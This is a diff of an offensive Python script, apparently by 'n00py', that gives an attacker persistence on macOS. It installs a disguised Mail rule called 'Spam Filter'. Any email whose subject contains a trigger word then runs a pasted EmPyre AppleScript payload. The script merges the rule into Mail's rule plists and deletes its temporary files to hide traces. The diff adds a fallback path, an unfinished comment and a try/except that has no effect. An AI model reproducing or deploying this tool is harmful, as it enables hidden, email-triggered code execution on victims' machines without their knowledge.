@@ -8,12 +8,11 @@ __author__ = 'Esteban Rodriguez (n00py)'
 ruleName = "Spam Filter"
 #Enter the 'trigger' word; This will need to be present in the subject line to execute the payload
 trigger = "Harambe"
-
+#If you would like conformation 
 #Paste the applescript here
 #NOTE: When copying the applescript from EmPyre make sure you escape the backslashes twice!  Also remove the last double quote.
 payload =  '''
 '''
-
 #-------------------------------------END OF USER DEFINED PARAMETERS-------------------------------------#
 
 #This makes the applescript kill itself after the python payload is executed
@@ -110,7 +109,13 @@ with open(script, 'w+') as f:
     f.write(payload)
     f.close()
 
-os.system("/usr/libexec/PlistBuddy -c 'Merge " + SyncedRules + "' " + home + "/Library/Mobile\ Documents/com~apple~mail/Data/V3/MailData/ubiquitous_SyncedRules.plist")
+try:
+    #If this exists, this should auto-sync immediately and overwrite any value in SyncedRules.plist
+    os.system("/usr/libexec/PlistBuddy -c 'Merge " + SyncedRules + "' " + home + "/Library/Mobile\ Documents/com~apple~mail/Data/V3/MailData/ubiquitous_SyncedRules.plist")
+except:
+    #If it doesn't, here is the main file for rules that will become active on restart
+    os.system("/usr/libexec/PlistBuddy -c 'Merge " + SyncedRules + "' " + home + "/Library/Mail/V3/MailData/SyncedRules.plist")
+
 os.system("/usr/libexec/PlistBuddy -c 'Merge " + RulesActiveState + "' "+ home + "/Library/Mail/V3/MailData/RulesActiveState.plist")
 os.system("rm " + SyncedRules)
 os.system("rm " + RulesActiveState)
